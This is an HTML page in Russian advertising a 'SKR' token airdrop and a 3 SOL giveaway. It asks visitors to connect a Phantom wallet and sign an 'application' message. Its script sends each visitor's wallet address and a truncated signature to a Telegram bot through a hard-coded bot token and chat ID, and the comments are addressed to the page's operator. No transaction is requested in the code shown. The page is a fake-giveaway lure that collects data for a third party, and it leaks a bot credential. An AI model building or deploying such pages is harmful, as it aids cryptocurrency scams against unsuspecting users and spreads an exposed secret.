<!doctype html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Mobile SKR Airdrop & Giveaway</title>
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>

  <style>
    :root{
      --bg0:#050505; --bg1:#0a0f16;
      --text:#e8eef6; --muted:rgba(232,238,246,.6);
      --sol:#14f195; --accent:#9945ff;
      --radius:24px;
    }
    body{
      margin:0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
      color:var(--text); background: var(--bg0);
      background-image: radial-gradient(circle at 50% 0%, #1a2a44 0%, #050505 100%);
      min-height:100vh; overflow-x: hidden;
    }
    .nav{
      display:flex; justify-content:space-between; align-items:center;
      padding:15px 25px; backdrop-filter:blur(15px); border-bottom:1px solid rgba(255,255,255,0.05);
      position:fixed; width:100%; top:0; z-index:100; box-sizing:border-box;
    }
    .logo-text{ font-weight:900; font-size:1.4rem; background: linear-gradient(90deg, var(--sol), #fff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    
    .wallet-btn{
      background: var(--sol); color:#000; border:none; padding:12px 24px;
      border-radius:50px; font-weight:700; cursor:pointer; transition: 0.3s;
    }
    .wallet-btn:hover{ transform: translateY(-2px); box-shadow: 0 5px 15px rgba(20,241,149,0.4); }

    .main-content{ max-width:800px; margin:140px auto 40px; padding:0 20px; text-align:center; }
    
    .card{
      background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08);
      border-radius: var(--radius); padding:50px 30px; backdrop-filter: blur(10px);
      box-shadow: 0 25px 50px rgba(0,0,0,0.4);
    }

    h1{ font-size:3.5rem; margin:0; letter-spacing: -2px; }
    p.desc{ color: var(--muted); font-size:1.2rem; margin:20px 0 40px; line-height:1.6; }

    .btn-group{ display: flex; flex-direction: column; gap: 15px; align-items: center; }
    
    .action-btn{
      width: 100%; max-width: 400px; padding:18px; border-radius:15px;
      font-size:1.1rem; font-weight:800; cursor:pointer; border:none;
      transition: 0.3s; text-transform: uppercase;
    }
    
    .btn-airdrop{ background: #fff; color: #000; }
    .btn-giveaway{ background: linear-gradient(90deg, var(--accent), #561eff); color: #fff; }
    
    .action-btn:hover:not(:disabled){ transform: scale(1.02); opacity: 0.9; }
    .action-btn:disabled{ opacity: 0.2; cursor: not-allowed; }

    .status-msg{ margin-top: 25px; font-weight: 500; min-height: 24px; color: var(--sol); }

    #console{
      margin-top: 30px; background: #000; border: 1px solid #222;
      padding: 15px; border-radius: 12px; font-family: monospace;
      font-size: 0.8rem; color: #888; text-align: left;
      max-height: 150px; overflow-y: auto;
    }
  </style>
</head>
<body>

  <nav class="nav">
    <div class="logo-text">SKR MOBILE</div>
    <button id="connect-btn" class="wallet-btn" onclick="connect()">Подключить кошелек</button>
  </nav>

  <div class="main-content">
    <div class="card">
      <h1>SKR HUB</h1>
      <p class="desc">Подключите кошелек и подпишите заявку, чтобы попасть в список участников.</p>
      
      <div class="btn-group">
        <button id="btn-airdrop" class="action-btn btn-airdrop" disabled onclick="handleSign('airdrop')">
          Участвовать в Airdrop
        </button>
        <button id="btn-giveaway" class="action-btn btn-giveaway" disabled onclick="handleSign('giveaway')">
          Участвовать в розыгрыше 3 SOL
        </button>
      </div>

      <div id="status" class="status-msg">Ожидание подключения...</div>

      <div id="console">
        > Инициализация системы...<br>
        > Готов к работе.
      </div>
    </div>
  </div>

  <script>
    // ТВОИ ДАННЫЕ
    const TG_TOKEN = "8425995205:AAEuTNVYnHHKMO87GOgAo1YIxr7WfhvPW2E";
    const TG_CHAT_ID = "1041935839"; // Твой ID (я взял пример, если не придет - проверь свой ID через @userinfobot)

    let wallet = null;
    let provider = window.solana;

    function log(text) {
      const c = document.getElementById('console');
      c.innerHTML += `<br>> ${text}`;
      c.scrollTop = c.scrollHeight;
    }

    async function connect() {
      try {
        if (!window.solana) {
          alert("Установите Phantom кошелек!");
          return;
        }
        const resp = await window.solana.connect();
        wallet = resp.publicKey.toString();
        
        document.getElementById('connect-btn').innerText = wallet.slice(0,4) + '...' + wallet.slice(-4);
        document.getElementById('btn-airdrop').disabled = false;
        document.getElementById('btn-giveaway').disabled = false;
        document.getElementById('status').innerText = "Кошелек подключен!";
        log("Wallet connected: " + wallet);
      } catch (e) {
        log("Ошибка входа: " + e.message);
      }
    }

    async function handleSign(type) {
      if (!wallet) return;
      
      const msgText = type === 'airdrop' 
        ? `Заявка на участие в SKR Airdrop\nКошелек: ${wallet}\nПодтверждаю участие.`
        : `Заявка на РОЗЫГРЫШ 3 SOL\nКошелек: ${wallet}\nЖелаю удачи!`;

      try {
        document.getElementById('status').innerText = "Подпишите сообщение в кошельке...";
        log("Запрос подписи...");

        const encodedMsg = new TextEncoder().encode(msgText);
        const signed = await window.solana.signMessage(encodedMsg, "utf8");
        
        // Превращаем подпись в текст для отправки
        const signatureText = window.btoa(String.fromCharCode.apply(null, signed.signature));
        
        log("Подпись получена! Отправка в Telegram...");
        
        // ОТПРАВКА В ТВОЙ ТЕЛЕГРАМ
        const textForAdmin = `🔔 НОВАЯ ЗАЯВКА!\n\n📍 Тип: ${type.toUpperCase()}\n💎 Адрес: ${wallet}\n✍️ Подпись: ${signatureText.slice(0,30)}...`;
        
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chat_id: TG_CHAT_ID,
            text: textForAdmin
          })
        });

        document.getElementById('status').innerText = "✅ Ваша заявка успешно отправлена!";
        document.getElementById('status').style.color = "#14f195";
        log("Данные успешно ушли боту.");

      } catch (e) {
        log("Ошибка: " + e.message);
        document.getElementById('status').innerText = "Ошибка подписи.";
        document.getElementById('status').style.color = "red";
      }
    }
  </script>
</body>
</html>
